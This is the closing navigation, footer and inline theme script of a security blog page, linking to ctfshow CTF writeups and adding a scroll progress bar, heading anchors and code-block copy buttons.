sm:grid-cols-2"> <a href="/posts/ctfshow-web-php-111-137-writeup" class="flex w-full gap-1 hover:opacity-75"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block flex-none rtl:rotate-180"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 6l-6 6l6 6" /></svg> <div> <span>Previous Post</span> <div class="text-sm text-accent/85">ctfshow Web入门[PHP特性] web111-137 Writeup</div> </div> </a> <a href="/posts/ctfshow-web-exec-56-77-writeup" class="flex w-full justify-end gap-1 text-end hover:opacity-75 sm:col-start-2"> <div> <span>Next Post</span> <div class="text-sm text-accent/85">ctfshow Web入门[命令执行] web56-77 Writeup</div> </div> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block flex-none rtl:rotate-180"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M9 6l6 6l-6 6" /></svg> </a> </div> </main> <footer class="w-full mt-auto"> <div class="mx-auto max-w-app px-0"> <hr class="border-border" aria-hidden="true"> </div> <div class="flex flex-col items-center justify-between py-6 sm:flex-row-reverse sm:py-4"> <div class="flex-wrap justify-center gap-1 flex"> <a href="https://github.com/X1r0z" class="group inline-block hover:text-accent p-2 hover:rotate-6 sm:p-1" title="X1r0z Blog on GitHub"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" /></svg> <span class="sr-only">X1r0z Blog on GitHub</span> </a><a href="https://x.com/X1r0z" class="group inline-block hover:text-accent p-2 hover:rotate-6 sm:p-1" title="X1r0z Blog on X"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M4 4l11.733 16h4.267l-11.733 -16z" /><path d="M4 20l6.768 -6.768m2.46 -2.46l6.772 -6.772" /></svg> <span class="sr-only">X1r0z Blog on X</span> </a><a href="https://www.linkedin.com/in/x1r0z/" class="group inline-block hover:text-accent p-2 hover:rotate-6 sm:p-1" title="X1r0z Blog on LinkedIn"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M8 11v5" /><path d="M8 8v.01" /><path d="M12 16v-5" /><path d="M16 16v-3a2 2 0 1 0 -4 0" /><path d="M3 7a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v10a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4z" /></svg> <span class="sr-only">X1r0z Blog on LinkedIn</span> </a><a href="mailto:i@exp10it.io" class="group inline-block hover:text-accent p-2 hover:rotate-6 sm:p-1" title="Send an email to X1r0z Blog"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z" /><path d="M3 7l9 6l9 -6" /></svg> <span class="sr-only">Send an email to X1r0z Blog</span> </a> </div> <div class="my-2 flex flex-col items-center whitespace-nowrap sm:flex-row"> <span>Copyright &#169; 2026</span> <span class="hidden sm:inline">&nbsp;|&nbsp;</span> <span>All rights reserved.</span> </div> </div> </footer>  </body></html> <script data-astro-rerun>
+  /** Create a progress indicator
+   *  at the top */
+  function createProgressBar() {
+    // Create the main container div
+    const progressContainer = document.createElement("div");
+    progressContainer.className =
+      "progress-container fixed top-0 z-10 h-1 w-full bg-background";
+
+    // Create the progress bar div
+    const progressBar = document.createElement("div");
+    progressBar.className = "progress-bar h-1 w-0 bg-accent";
+    progressBar.id = "myBar";
+
+    // Append the progress bar to the progress container
+    progressContainer.appendChild(progressBar);
+
+    // Append the progress container to the document body or any other desired parent element
+    document.body.appendChild(progressContainer);
+  }
+  createProgressBar();
+
+  /** Update the progress bar
+   *  when user scrolls */
+  function updateScrollProgress() {
+    document.addEventListener("scroll", () => {
+      const winScroll =
+        document.body.scrollTop || document.documentElement.scrollTop;
+      const height =
+        document.documentElement.scrollHeight -
+        document.documentElement.clientHeight;
+      const scrolled = (winScroll / height) * 100;
+      if (document) {
+        const myBar = document.getElementById("myBar");
+        if (myBar) {
+          myBar.style.width = scrolled + "%";
+        }
+      }
+    });
+  }
+  updateScrollProgress();
+
+  /** Attaches links to headings in the document,
+   *  allowing sharing of sections easily */
+  function addHeadingLinks() {
+    const headings = Array.from(
+      document.querySelectorAll("h2, h3, h4, h5, h6")
+    );
+    for (const heading of headings) {
+      heading.classList.add("group");
+      const link = document.createElement("a");
+      link.className =
+        "heading-link ms-2 no-underline opacity-75 md:opacity-0 md:group-hover:opacity-100 md:focus:opacity-100";
+      link.href = "#" + heading.id;
+
+      const span = document.createElement("span");
+      span.ariaHidden = "true";
+      span.innerText = "#";
+      link.appendChild(span);
+      heading.appendChild(link);
+    }
+  }
+  addHeadingLinks();
+
+  /** Attaches copy buttons to code blocks in the document,
+   * allowing users to copy code easily. */
+  function attachCopyButtons() {
+    const copyButtonLabel = "Copy";
+    const codeBlocks = Array.from(document.querySelectorAll("pre"));
+
+    for (const codeBlock of codeBlocks) {
+      const wrapper = document.createElement("div");
+      wrapper.style.position = "relative";
+
+      // Check if --file-name-offset custom property exists
+      const computedStyle = getComputedStyle(codeBlock);
+      const hasFileNameOffset =
+        computedStyle.getPropertyValue("--file-name-offset").trim() !== "";
+
+      // Determine the top positioning class
+      const topClass = hasFileNameOffset
+        ? "top-(--file-name-offset)"
+        : "-top-3";
+
+      const copyButton = document.createElement("button");
+      copyButton.className = `copy-code absolute end-3 ${topClass} rounded bg-muted border border-muted px-2 py-1 text-xs leading-4 text-foreground font-medium`;
+      copyButton.innerHTML = copyButtonLabel;
+      codeBlock.setAttribute("tabindex", "0");
+      codeBlock.appendChild(copyButton);
+
+      // wrap codebock with relative parent element
+      codeBlock?.parentNode?.insertBefore(wrapper, codeBlock);
+      wrapper.appendChild(codeBlock);
+
+      copyButton.addEventListener("click", async () => {
+        await copyCode(codeBlock, copyButton);
+      });
+    }
+
+    async function copyCode(block, button) {
+      const code = block.querySelector("code");
+      const text = code?.innerText;
+
+      await navigator.clipboard.writeText(text ?? "");
+
+      // visual feedback that task is completed
+      button.innerText = "Copied";
+
+      setTimeout(() => {
+        button.innerText = copyButtonLabel;
+      }, 700);
+    }
+  }
+  attachCopyButtons();
+
+  /* Go to page start after page swap */
+  document.addEventListener("astro:after-swap", () =>
+    window.scrollTo({ left: 0, top: 0, behavior: "instant" })
+  );
+</script>
